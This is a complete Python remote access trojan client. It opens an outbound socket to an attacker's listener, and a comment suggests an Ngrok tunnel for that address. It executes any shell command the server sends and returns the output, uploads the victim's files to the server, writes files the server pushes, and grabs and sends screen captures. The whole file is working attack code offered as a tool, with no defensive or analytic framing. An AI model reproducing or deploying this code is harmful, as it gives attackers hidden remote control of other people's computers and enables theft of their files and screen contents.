import socket
import subprocess
from PIL import ImageGrab
import os

def connect_to_listener(host, port):
	global client
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client.connect((host, port))

	while True:
		command = client.recv(4096).decode()

		if command.lower() == "exit":
			break

		if command.lower() == "screenshot":
			send_screenshot(client)
		elif command[:8].lower() == "download":
			upload_file(command[9:])
		elif command[:6].lower()=="upload":
			download_file()
		elif command.lower().startswith("cd "):
			try:
				os.chdir(command[3:])
				client.send(b"CHANGED_DIR")
			except:
				client.send(b"DIR_NOT_FOUND")
		else:
			output = subprocess.getoutput(command)
			if len(output) == 0:
				client.send(b" ")
			else:
				client.send(output.encode())


	client.close()

def send_screenshot(client):
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.jpg", "JPEG")

    with open("screenshot.jpg", "rb") as file:
        data = file.read(4096)
        while data:
            client.send(data)
            data = file.read(4096)

    client.send(b"DONE")
    print("[*] 🖼️ Screenshot sent")


def upload_file(file_name):
			if not os.path.exists(file_name):
				client.send(b"FILE_NOT_FOUND")
				return
			client.send(b"SENDING_FILES")
			f = open(file_name, "rb")
			client.send(f.read())
			print("[*] Sent File To Server")



def download_file():
			data = client.recv(1024).decode()
			if data == "FILE_NOT_CHOSE":
				return
			repets = client.recv(1024).decode()
			for _ in range(int(repets)):
				file_name = client.recv(1024).decode()
				f = open(file_name, "wb")
				client.settimeout(1)
				chunk = client.recv(1024)
				while chunk:
					f.write(chunk)
					try:
						chunk = client.recv(1024)
					except socket.timeout as e:
						break
				client.settimeout(None)
				f.close()
				print("[*] File Recived From Server")

if __name__ == "__main__":
	host = "localhost"  # Replace with your Ngrok tunnel URL
	port = 1234  # Replace with your listener's port number
	connect_to_listener(host, port)
